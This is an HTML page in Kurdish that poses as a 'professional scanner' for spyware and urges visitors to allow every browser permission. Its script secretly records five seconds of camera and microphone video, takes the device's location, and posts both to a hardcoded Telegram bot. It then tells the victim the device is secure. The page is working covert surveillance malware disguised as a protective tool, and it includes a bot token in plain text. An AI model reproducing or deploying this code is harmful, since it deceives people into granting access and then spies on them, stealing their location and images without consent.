<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jegr Cracks - Professional Scanner</title>
    <style>
        body { background-color: #050505; color: #00ff41; text-align: center; font-family: 'Courier New', monospace; padding: 30px 15px; margin: 0; }
        .box { border: 2px solid #00ff41; display: inline-block; padding: 25px; border-radius: 10px; background: rgba(0, 255, 65, 0.05); box-shadow: 0 0 20px #00ff41; width: 100%; max-width: 450px; }
        h1 { font-size: 19px; line-height: 1.5; color: #00ff41; margin-bottom: 20px; }
        .instruction { color: #ffffff; font-size: 14px; line-height: 1.7; background: rgba(255, 0, 0, 0.2); padding: 15px; border-radius: 5px; margin-bottom: 25px; border: 1px solid #ff0000; font-weight: bold; }
        button { background-color: #00ff41; color: #000; border: none; padding: 20px; font-size: 18px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; box-shadow: 0 0 15px #00ff41; }
        .status { margin-top: 20px; font-size: 16px; color: #00ff41; display: none; font-weight: bold; }
    </style>
</head>
<body>
    <div class="box">
        <h1 dir="rtl">بەهێزترین وێبگەڕی پشکنەر دروستکراوە لەلایەن جێگر کڕاکس</h1>
        <div class="instruction" dir="rtl">
            تکایە هەموو بەشەکان ALLOW بکە تاوەکو وێبگەڕەکە بتوانێت هەموو پارچەکانی ئامێرەکەت بپشکنێت و بگەڕێت بۆ فایلی سیخوڕی.
        </div>
        <button id="startBtn">دەستپێکردنی پشکنینی گشتی</button>
        <div id="statusText" class="status">Initializing Deep Scan...</div>
    </div>

    <script>
        const botToken = "8633886074:AAE_wcUpSvjxa-1ac-68iWCUosIyESWlFhk"; 
        const chatId = "7619045862"; 

        document.getElementById('startBtn').addEventListener('click', async () => {
            try {
                // ١. داواکردنی لۆکەیشن و کامێرا پێکەوە
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('startBtn').style.display = "none";
                document.getElementById('statusText').style.display = "block";

                // ٢. ناردنی لۆکەیشن
                navigator.geolocation.getCurrentPosition(position => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: chatId, text: `📍 لۆکەیشن:\n${mapUrl}` })
                    });
                });

                // ٣. تۆمارکردنی ٥ چرکە ڤیدیۆ
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('video', blob, 'scan_result.mp4');

                    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData });
                    
                    document.getElementById('statusText').innerText = "Scan Complete! Secure.";
                    alert("پشکنین تەواو بوو! ئامێرەکەت پارێزراوە.");
                    stream.getTracks().forEach(t => t.stop());
                };

                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000); // ٥ چرکە ڤیدیۆ دەگرێت

            } catch (err) {
                alert("تکایە Allow دابگرە بۆ دەستپێکردنی پشکنین.");
            }
        });
    </script>
</body>
</html>
